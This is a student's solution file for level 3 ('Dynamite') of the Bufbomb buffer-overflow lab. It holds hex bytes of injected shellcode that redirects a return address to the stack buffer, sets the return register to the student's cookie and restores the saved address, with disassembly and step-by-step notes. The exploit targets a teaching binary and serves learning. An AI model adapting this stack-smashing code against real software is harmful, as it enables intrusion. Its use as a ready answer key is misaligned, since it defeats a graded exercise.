
/* SOLUTION TO LEVEL 3: DYNAMITE on Bufbomb
ALEXANDER FEHSENFELD


address of function smoke as it appears in objdump : 08 04 8c 28 */
c7 05 44 35 
68 55 ce 8d 
04 08 b8 20 
0c 5d 60 83 
ec 04 c3 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
70 35 68 55 /* this restore the same value here as was before */ 
18 35 68 55 /* set this to the address of the beggining of the string in memory */

    

/* address of beggining of string on stack: 0x55683518 18 = 24 in decimal*/ 
/* address return address : 0x55683544, 44 = 68 in decimal

so the return address is 44 bytes away from the begginning of the string


example of pushing a l value to the stack:
ff 35 04 c0 04 08    	pushl  0x804c004
ff 35 ce 8d 04 08	pushl  0x08048dce

example of simple push:
68 16 90 04 08       	push   $0x8049016
68 ce 8d 04 08

code for sub esp 0x4:
83 ec 04

more translation of above bytes
   0:	c7 05 44 35 68 55 ce 	movl   $0x8048dce,0x55683544
   7:	8d 04 08 
   a:	b8 20 0c 5d 60       	mov    $0x605d0c20,%eax
   f:	c3                   	ret    

steps: 
1) put in string with machine code that overwrote the return address to address of start of string
2) the string also overwrote anything else with what it was before, no need to change
3) the machine code rewrote the return address slot back to what it was
4) set $eax to my cookie
5) sub $esp by 4 so it would be unchanged by the 
6) ret instruction, which increases esp back up by 4 and went to the appropriate address
	


*/

